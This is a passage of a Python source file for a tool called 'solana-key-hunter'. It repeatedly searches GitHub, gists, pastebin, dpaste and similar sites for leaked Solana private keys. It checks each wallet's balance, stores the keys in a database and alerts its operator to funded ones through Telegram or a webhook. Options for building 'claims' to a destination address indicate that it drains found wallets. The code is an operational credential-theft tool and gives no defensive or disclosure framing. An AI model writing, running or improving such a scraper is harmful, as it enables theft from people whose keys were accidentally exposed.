    except Exception:
        return
    if not isinstance(items, list):
        return
    log.info("[dpaste] %d pastes", len(items))
    for it in items:
        if time.monotonic() > deadline:
            return
        pid = it.get("id") or it.get("slug")
        if pid:
            yield f"https://dpaste.org/{pid}/raw/", "dpaste", {}, None


SOURCES = {
    "github": src_github, "gists": src_gists, "gitlab": src_gitlab,
    "grepapp": src_grepapp, "pastebin": src_pastebin, "dpaste": src_dpaste,
}

GITHUB_QUERIES = [
    '"privateKey" solana', '"secretKey" solana', '"SOLANA_PRIVATE_KEY"',
    '"PRIVATE_KEY" phantom', '"keypair" solana extension:json',
    'solana "private_key"', '"secret_key" solana', 'filename:id.json solana',
    'filename:keypair.json', '"solana" "base58" private', 'solana "signer"',
]


# --------------------------------------------------------------------------- #
# Worker
# --------------------------------------------------------------------------- #
class Hunter:
    def __init__(self, cfg: Config, store: Store, reporter: Reporter) -> None:
        self.cfg = cfg
        self.store = store
        self.reporter = reporter
        self.stats = {k: 0 for k in ("fetched", "failed", "prefiltered", "skipped",
                                     "cands", "rejected", "new", "known", "low")}
        self.reasons: dict[str, int] = {}
        self.slock = threading.Lock()

    def bump(self, key: str, n: int = 1) -> None:
        with self.slock:
            self.stats[key] = self.stats.get(key, 0) + n

    def reason(self, text: str) -> None:
        with self.slock:
            self.reasons[text] = self.reasons.get(text, 0) + 1

    # -- document --------------------------------------------------------- #
    def handle(self, url: str, source: str, headers: dict, inline: Optional[str]) -> None:
        if self.store.should_skip(url):
            self.bump("skipped")
            trace("[skip] already done: %s", url)
            return

        self.store.mark_attempt(url)
        self.bump("fetched")

        if inline is not None:
            text = inline[:MAX_TEXT]
            log.debug("[inline] %s %d chars", url, len(text))
        else:
            text = self._fetch(url, headers)
            if text is None:
                self.store.mark(url, "failed")
                self.bump("failed")
                return

        ctx = DocContext(text=text, url=url,
                         filename_hint=bool(RE_FILENAME_HINT.search(url)),
                         anchor=bool(RE_ANCHOR.search(text)),
                         repo_hint="solana" in url.lower())

        if not self.cfg.args.no_prefilter and not self._prefilter(text, ctx):
            self.store.mark(url, "skipped")
            self.bump("prefiltered")
            return

        cands = extract(text, ctx)
        log.debug("[scan] %s -> %d candidates", url, len(cands))
        if not cands:
            self.store.mark(url, "skipped")
            return
        self.bump("cands", len(cands))

        for cand in cands:
            try:
                self._evaluate(cand, ctx, source, url)
            except Exception:
                log.exception("candidate failed in %s", url)

        self.store.mark(url, "processed")

    def _fetch(self, url: str, headers: dict) -> Optional[str]:
        t0 = time.monotonic()
        try:
            r = session().get(url, headers=headers, timeout=25, stream=True)
            try:
                chunks, total = [], 0
                for chunk in r.iter_content(65536):
                    chunks.append(chunk)
                    total += len(chunk)
                    if total >= MAX_TEXT:
                        break
                raw = b"".join(chunks)
            finally:
                r.close()
        except Exception as e:
            log.debug("[fetch] %s failed: %s", url, e)
            return None
        dt = (time.monotonic() - t0) * 1000
        ctype = r.headers.get("content-type", "")
        log.debug("[fetch] %s -> %d %s %dB %.0fms", url, r.status_code,
                  ctype.split(";")[0] or "-", len(raw), dt)
        if r.status_code != 200:
            return None
        if any(b in ctype for b in ("image/", "audio/", "video/", "font/")):
            self.reason("binary content-type")
            return ""
        try:
            return raw.decode(r.encoding or "utf-8", errors="replace")
        except Exception:
            return raw.decode("utf-8", errors="replace")

    def _prefilter(self, text: str, ctx: DocContext) -> bool:
        if RE_KEY64.search(text) or RE_BRACKET.search(text) or RE_HEX64.search(text):
            return True
        if ctx.anchor and RE_KEY32.search(text):
            return True
        if ctx.filename_hint and (RE_KEY32.search(text) or RE_HEX32.search(text)):
            return True
        self.reason("prefilter: no key-shaped blob")
        return False

    # -- candidate -------------------------------------------------------- #
    def _evaluate(self, cand: Candidate, ctx: DocContext, source: str, url: str) -> None:
        sk = derive(cand)
        if sk is None:
            self.bump("rejected")
            self.reason(f"derive failed ({cand.kind})")
            trace("  rejected %s", cand.kind)
            return
        cross_validate(cand, ctx.text)
        address = cand.address or ""
        trace("  candidate %s score=%d addr=%s", cand.kind, cand.score, address)

        if self.store.has_address(address):
            self.bump("known")
            return
        if cand.score < self.cfg.args.min_score:
            self.bump("low")
            self.reason(f"below min-score ({cand.kind})")
            return

        deep = cand.score >= self.cfg.args.deep_score
        p = probe(self.cfg, address, deep=deep)

        key_b58 = base58.b58encode(cand.raw).decode()
        key_json = json.dumps(list(cand.raw))
        self.bump("new")
        self.store.put(("upsert", (
            address, key_b58, key_json, cand.kind, cand.score, p.lamports,
            int(p.exists), p.sig_count, p.token_count,
            json.dumps(p.tokens) if p.tokens else None, p.priority,
            source, url, now_iso(), now_iso(), 0)))

        if p.priority or p.lamports > 0 or cand.score >= self.cfg.args.report_score:
            self.reporter.emit(address, key_b58, key_json, cand, p, source, url)


# --------------------------------------------------------------------------- #
# Re-check scheduler
# --------------------------------------------------------------------------- #
def recheck_loop(cfg: Config, store: Store, reporter: Reporter) -> None:
    while not cfg.stop.is_set():
        if cfg.stop.wait(cfg.args.recheck_interval):
            return
        due = store.due_for_recheck(cfg.args.recheck_after, cfg.args.recheck_batch)
        if not due:
            continue
        log.info("recheck: %d address(es)", len(due))
        for address in due:
            if cfg.stop.is_set():
                return
            try:
                p = probe(cfg, address, deep=True)
            except Exception as e:
                log.debug("recheck %s failed: %s", address, e)
                continue
            row = _load_row(store, address)
            if row is None:
                continue
            key_b58, key_json, score, kind, reported = row
            store.put(("upsert", (
                address, key_b58, key_json, kind, score, p.lamports, int(p.exists),
                p.sig_count, p.token_count, json.dumps(p.tokens) if p.tokens else None,
                p.priority, "recheck", None, now_iso(), now_iso(), 0)))
            if p.lamports > reported or (p.tokens and not reported):
                log.info("recheck change: %s now %d lamports", address, p.lamports)
                cand = Candidate(raw=b"", kind=kind, offset=0, score=score, address=address)
                reporter.emit(address, key_b58, key_json, cand, p, "recheck", "")
                store.put(("reported", address, p.lamports))


def _load_row(store: Store, address: str):
    with store.rlock:
        return store.rconn.execute(
            "SELECT key_b58, key_json, score, kind, reported_lamports "
            "FROM keys WHERE address=?", (address,)).fetchone()


# --------------------------------------------------------------------------- #
# Cycle
# --------------------------------------------------------------------------- #
def run_cycle(cfg: Config, store: Store, hunter: Hunter) -> None:
    chosen = [s for s in cfg.args.sources.split(",") if s in SOURCES]
    if not chosen:
        log.error("no valid sources in %r", cfg.args.sources)
        return

    deadline = time.monotonic() + cfg.args.cycle_budget
    workers = cfg.args.workers
    slots = threading.BoundedSemaphore(workers * 4)
    store.put(("prune",))

    log.info("cycle start sources=%s workers=%d budget=%ss",
             chosen, workers, cfg.args.cycle_budget)

    def guarded(*a):
        try:
            hunter.handle(*a)
        finally:
            slots.release()

    with cf.ThreadPoolExecutor(max_workers=workers, thread_name_prefix="w") as pool:
        for name in chosen:
            if cfg.stop.is_set():
                break
            log.info("source %s begin", name)
            try:
                n = 0
                for url, source, headers, inline in SOURCES[name](cfg, deadline):
                    if cfg.stop.is_set():
                        break
                    slots.acquire()
                    pool.submit(guarded, url, source, headers, inline)
                    n += 1
                log.info("source %s queued %d", name, n)
            except Exception:
                log.exception("source %s crashed", name)

    total, lamports = store.counts()
    print("\n" + "-" * 78)
    print("cycle done  " + "  ".join(f"{k}={v}" for k, v in hunter.stats.items()))
    if hunter.reasons:
        top = sorted(hunter.reasons.items(), key=lambda kv: -kv[1])[:6]
        print("  rejects: " + ", ".join(f"{r} x{n}" for r, n in top))
    print(f"  db: keys={total} lamports={lamports} ({lamports / LAMPORTS_PER_SOL:.9f} SOL)")
    print("-" * 78 + "\n")
    sys.stdout.flush()


# --------------------------------------------------------------------------- #
# CLI
# --------------------------------------------------------------------------- #
def normalize_argv(argv: list[str]) -> list[str]:
    out: list[str] = []
    for a in argv:
        if RE_VRUN.match(a):
            out.extend(["-v"] * (len(a) - 1))
        else:
            out.append(a)
    return out


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="Hunt for leaked Solana private keys")
    g = p.add_argument_group("config")
    g.add_argument("--env-file", default=os.environ.get("HUNTER_ENV_FILE", ".env"))
    g.add_argument("--no-dotenv", action="store_true")
    g.add_argument("--env-override", action="store_true")
    g.add_argument("--init-env", action="store_true")
    g.add_argument("--force", action="store_true")
    g.add_argument("--show-config", action="store_true")

    p.add_argument("-v", "--verbose", action="count", default=0)
    p.add_argument("--debug", action="store_true")
    p.add_argument("--trace", action="store_true")
    p.add_argument("--verbosity", type=int, default=None)
    p.add_argument("-q", "--quiet", action="store_true")
    p.add_argument("--log-file", default=os.environ.get("HUNTER_LOG_FILE"))

    p.add_argument("--sources", default=os.environ.get(
        "HUNTER_SOURCES", "github,gists,grepapp,pastebin,dpaste"))
    p.add_argument("--db", default=os.environ.get("HUNTER_DB", "found_keys.db"))
    p.add_argument("--interval", type=int, default=int(os.environ.get("HUNTER_INTERVAL", 180)))
    p.add_argument("--workers", type=int, default=int(os.environ.get("HUNTER_WORKERS", 8)))
    p.add_argument("--cycle-budget", type=int,
                   default=int(os.environ.get("HUNTER_CYCLE_BUDGET", 300)))
    p.add_argument("--pages", type=int, default=int(os.environ.get("HUNTER_PAGES", 2)))
    p.add_argument("--queries-per-cycle", type=int,
                   default=int(os.environ.get("HUNTER_QUERIES_PER_CYCLE", 4)))
    p.add_argument("--queries-file", default=os.environ.get("HUNTER_QUERIES_FILE"))
    p.add_argument("--fresh-days", type=int, default=int(os.environ.get("HUNTER_FRESH_DAYS", 30)))
    p.add_argument("--github-delay", type=float,
                   default=float(os.environ.get("HUNTER_GITHUB_DELAY", 6.5)))

    p.add_argument("--min-score", type=int, default=int(os.environ.get("HUNTER_MIN_SCORE", 25)))
    p.add_argument("--report-score", type=int,
                   default=int(os.environ.get("HUNTER_REPORT_SCORE", 40)))
    p.add_argument("--deep-score", type=int,
                   default=int(os.environ.get("HUNTER_DEEP_SCORE", 40)))
    p.add_argument("--min-lamports", type=int,
                   default=int(os.environ.get("HUNTER_MIN_LAMPORTS", 0)))
    p.add_argument("--no-balance", action="store_true")
    p.add_argument("--no-prefilter", action="store_true")
    p.add_argument("--revisit", action="store_true")
    p.add_argument("--seen-ttl-days", type=int,
                   default=int(os.environ.get("HUNTER_SEEN_TTL_DAYS", 30)))

    p.add_argument("--recheck-interval", type=int,
                   default=int(os.environ.get("HUNTER_RECHECK_INTERVAL", 3600)))
    p.add_argument("--recheck-after", type=int,
                   default=int(os.environ.get("HUNTER_RECHECK_AFTER", 21600)))
    p.add_argument("--recheck-batch", type=int,
                   default=int(os.environ.get("HUNTER_RECHECK_BATCH", 25)))
    p.add_argument("--rpc-rate", type=float, default=float(os.environ.get("HUNTER_RPC_RATE", 20)))

    p.add_argument("--jsonl", default=os.environ.get("HUNTER_JSONL", "hits.jsonl"))
    p.add_argument("--max-hit-bytes", type=int,
                   default=int(os.environ.get("HUNTER_MAX_HIT_BYTES", 5_000_000)))
    p.add_argument("--claim-dir", default=os.environ.get("HUNTER_CLAIM_DIR", "claims"))
    p.add_argument("--claim-build", action="store_true")
    p.add_argument("--dest", default=os.environ.get("HUNTER_DEST", ""))
    p.add_argument("--once", action="store_true")
    return p


ENV_TEMPLATE = """\
# solana-key-hunter configuration (chmod 600)
GITHUB_TOKEN=
PASTEBIN_KEY=
GITLAB_TOKEN=
SOURCEGRAPH_TOKEN=
SOLANA_RPC=https://api.mainnet-beta.solana.com
TELEGRAM_BOT_TOKEN=
TELEGRAM_CHAT_ID=
HUNTER_WEBHOOK=
HUNTER_DEST=
HUNTER_SOURCES=github,gists,grepapp,pastebin,dpaste
HUNTER_MIN_SCORE=25
HUNTER_WORKERS=8
HUNTER_INTERVAL=180
"""


def load_env(path: str, override: bool) -> str:
    if not path or not os.path.isfile(path):
        return "not found"
    if load_dotenv is None:
        n = 0
        with open(path, encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#") or "=" not in line:
                    continue
                k, v = line.split("=", 1)
                if override or k.strip() not in os.environ:
                    os.environ[k.strip()] = v.strip().strip("'\"")
                    n += 1
        return f"loaded {n} keys (builtin)"
    load_dotenv(path, override=override)
    return "loaded"


def main() -> int:
    argv = normalize_argv(sys.argv[1:])
    pre = argparse.ArgumentParser(add_help=False)
    pre.add_argument("--env-file", default=os.environ.get("HUNTER_ENV_FILE", ".env"))
    pre.add_argument("--no-dotenv", action="store_true")
    pre.add_argument("--env-override", action="store_true")
    pre.add_argument("--init-env", action="store_true")
    pre.add_argument("--force", action="store_true")
    pre_args, _ = pre.parse_known_args(argv)

    if pre_args.init_env:
        if os.path.exists(pre_args.env_file) and not pre_args.force:
            print(f"{pre_args.env_file}: exists (use --force)")
            return 1
        with open(pre_args.env_file, "w", encoding="utf-8") as f:
            f.write(ENV_TEMPLATE)
        os.chmod(pre_args.env_file, stat.S_IRUSR | stat.S_IWUSR)
        print(f"{pre_args.env_file}: written, mode 600. add it to .gitignore.")
        return 0

    env_note = "disabled" if pre_args.no_dotenv else load_env(
        pre_args.env_file, pre_args.env_override)

    args = build_parser().parse_args(argv)
    if args.verbosity is not None:
        verbosity = args.verbosity
    elif args.verbose or args.debug or args.trace:
        verbosity = max(args.verbose, 2 if args.trace else 1)
    else:
        verbosity = int(os.environ.get("HUNTER_VERBOSITY", 0))
    if args.quiet:
        verbosity = -1

    cfg = Config(args)
    cfg.notifier = Notifier(cfg)
    global RPC_LIMITER
    RPC_LIMITER = RateLimiter(args.rpc_rate)

    if args.show_config:
        print(f"{'env_file':<16} : {args.env_file} ({env_note})")
        for k, v in cfg.masked().items():
            print(f"{k:<16} : {v}")
        for k in ("sources", "db", "workers", "min_score", "report_score",
                  "deep_score", "rpc_rate", "interval", "cycle_budget", "claim_build"):
            print(f"{k:<16} : {getattr(args, k)}")
        cfg.notifier.close()
        return 0

    level = setup_logging(verbosity, args.log_file)
    log.info("solana-key-hunter %s", UA)
    log.info("dotenv: %s | level: %s", env_note, logging.getLevelName(level))
    if level <= TRACE:
        trace("TRACE active")
    log.info("config: %s", json.dumps(cfg.masked()))
    log.info("db=%s sources=%s workers=%d min_score=%d",
             args.db, args.sources, args.workers, args.min_score)

    store = Store(args.db, args.seen_ttl_days)
    reporter = Reporter(cfg)
    hunter = Hunter(cfg, store, reporter)

    if args.recheck_interval > 0:
        threading.Thread(target=recheck_loop, args=(cfg, store, reporter),
                         name="recheck", daemon=True).start()

    def _stop(*_):
        log.warning("signal received, finishing")
        cfg.stop.set()

    signal.signal(signal.SIGINT, _stop)
    signal.signal(signal.SIGTERM, _stop)

    try:
        while not cfg.stop.is_set():
            t0 = time.monotonic()
            try:
                run_cycle(cfg, store, hunter)
            except Exception:
                log.exception("cycle error")
            if args.once:
                break
            wait = max(5.0, args.interval - (time.monotonic() - t0))
            wait += random.uniform(0, 8)
            log.info("sleeping %.0fs", wait)
            cfg.stop.wait(wait)
    finally:
        cfg.notifier.close()
        store.close()
    total, lamports = 0, 0
    return 0


if __name__ == "__main__":
    sys.exit(main())